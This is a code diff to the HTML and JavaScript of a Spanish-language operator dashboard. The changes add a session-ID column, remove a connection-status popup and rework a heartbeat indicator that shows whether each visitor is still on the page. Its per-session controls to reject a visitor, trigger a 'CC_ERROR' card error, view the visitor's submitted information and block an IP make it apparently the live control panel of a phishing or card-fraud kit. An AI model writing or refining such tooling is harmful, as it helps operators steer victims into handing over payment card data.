@@ -184,8 +184,8 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
                 </div>
                 <div class="table-wrap">
                     <table>
-                        <thead><tr><th>IP</th><th>Última acción</th><th>Tiempo</th><th>Acciones</th></tr></thead>
-                        <tbody id="tbodyActivos"><tr><td colspan="4" class="empty">Cargando...</td></tr></tbody>
+                        <thead><tr><th>Session ID</th><th>IP</th><th>Última acción</th><th>Tiempo</th><th>Acciones</th></tr></thead>
+                        <tbody id="tbodyActivos"><tr><td colspan="5" class="empty">Cargando...</td></tr></tbody>
                     </table>
                 </div>
             </div>
@@ -381,10 +381,10 @@ function renderActivos() {
     const tbody = $('tbodyActivos'); 
     let lista = activosCache; 
     if (filtro) { 
-        lista = lista.filter(a => (a.ip || '').toLowerCase().includes(filtro) || (a.ultimaAccion || '').toLowerCase().includes(filtro)); 
+        lista = lista.filter(a => (a.ip || '').toLowerCase().includes(filtro) || (a.ultimaAccion || '').toLowerCase().includes(filtro) || (a.sessionId || '').toLowerCase().includes(filtro)); 
     } 
     if (!lista.length) { 
-        tbody.innerHTML = '<tr><td colspan="4" class="empty">Sin usuarios activos</td></tr>'; 
+        tbody.innerHTML = '<tr><td colspan="5" class="empty">Sin usuarios activos</td></tr>'; 
         return; 
     } 
     tbody.innerHTML = lista.map(a => {
@@ -394,6 +394,7 @@ function renderActivos() {
         
         return ` 
         <tr> 
+            <td class="dato" title="${escapeHtml(a.sessionId)}">${escapeHtml(truncar(a.sessionId, 15))}</td>
             <td class="ip">${escapeHtml(a.ip)}</td> 
             <td style="color:#88f456; font-weight:bold; font-size:12px;">${escapeHtml(accionMostrar)}</td> 
             <td>${formatTime(a.tiempoDentro)}</td> 
@@ -418,7 +419,7 @@ function botonesSesion(s) {
         btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
         btns.push(`<button class="btn" style="background:#f59e0b; color:white;" title="Error CC" onclick="accion('${sid}','CC_ERROR')">⚠️</button>`);
         btns.push(`<button class="btn" style="background:#3b82f6; color:white;" title="Ver Información del Usuario" onclick="verInfoUsuario('${sid}')">👁️</button>`);
-        btns.push(`<button class="btn" style="background:#8b5cf6; color:white;" title="Estado de Conexión" onclick="verConexionUsuario('${sid}', '${ip}')">📡</button>`);
+        // 📡 Boton de estado eliminado según solicitud
         btns.push(`<button class="btn btn-block" title="Bloquear y Expulsar IP" onclick="bloquearIp('${ip}')">🚫</button>`);
         return btns.join('');
     }
@@ -534,20 +535,25 @@ function renderSesiones() {
         const ip = datos.ip || '-';
         const checked = seleccionSesiones.has(s.sessionId) ? 'checked' : '';
 
-        let colorPunto = '#22c55e';
-        let tituloPunto = 'Usuario activo';
+        // Lógica del Semáforo Heartbeat (Verde <= 10s, Amarillo 10s - 30s, Rojo > 30s)
+        let colorPunto = '#ef4444';
+        let tituloPunto = 'Desconectado';
         const activoInfo = activosCache.find(a => a.sessionId === s.sessionId);
 
-        if (!activoInfo) {
-            colorPunto = '#ef4444';
-            tituloPunto = 'Usuario salió de forma definitiva';
-        } else {
+        if (activoInfo) {
             const ahora = Date.now();
             const ultimoHeartbeat = activoInfo.ultimoHeartbeat || 0;
             const segundosInactivo = (ahora - ultimoHeartbeat) / 1000;
-            if (segundosInactivo > 15) {
-                colorPunto = '#fbbf24';
-                tituloPunto = 'Usuario salió de la web (Inactivo)';
+            
+            if (segundosInactivo <= 10) {
+                colorPunto = '#22c55e'; // Verde
+                tituloPunto = 'Activo (' + Math.floor(segundosInactivo) + 's)';
+            } else if (segundosInactivo > 10 && segundosInactivo <= 30) {
+                colorPunto = '#fbbf24'; // Amarillo
+                tituloPunto = 'Inactivo (' + Math.floor(segundosInactivo) + 's)';
+            } else {
+                colorPunto = '#ef4444'; // Rojo
+                tituloPunto = 'Desconectado';
             }
         }
 
@@ -776,43 +782,6 @@ function verInfoUsuario(sessionId) {
         `,
         confirmButtonColor: '#88f456',
         confirmButtonText: 'Cerrar',
-        background: '#151b2e',
-        color: '#e5e7eb'
-    });
-}
-
-function verConexionUsuario(sessionId, ip) {
-    const activoInfo = activosCache.find(a => a.sessionId === sessionId);
-    let estadoMsg = '';
-    let color = '';
-    let icono = '';
-
-    if (!activoInfo) {
-        estadoMsg = 'El usuario ha cerrado la página o se ha desconectado.';
-        color = '#ef4444';
-        icono = 'error';
-    } else {
-        const ahora = Date.now();
-        const ultimoHeartbeat = activoInfo.ultimoHeartbeat || 0;
-        const segundosInactivo = Math.floor((ahora - ultimoHeartbeat) / 1000);
-        
-        if (segundosInactivo > 15) {
-            estadoMsg = `Usuario inactivo (Posiblemente salió de la pestaña).<br>Último latido hace <b>${segundosInactivo} segundos</b>.`;
-            color = '#fbbf24';
-            icono = 'warning';
-        } else {
-            estadoMsg = `Usuario <b>CONECTADO</b> en la página.<br>Latido recibido hace <b>${segundosInactivo} segundos</b>.`;
-            color = '#22c55e';
-            icono = 'success';
-        }
-    }
-
-    Swal.fire({
-        icon: icono,
-        title: '📡 Estado de Conexión',
-        html: `<p>${estadoMsg}</p><br><p style="font-size:12px; color:#8b94a8;"><b>IP:</b> ${escapeHtml(ip)}<br><b>Navegador:</b> ${escapeHtml(activoInfo?.userAgent || 'Desconocido')}</p>`,
-        confirmButtonText: 'Entendido',
-        confirmButtonColor: color,
         background: '#151b2e',
         color: '#e5e7eb'
     });
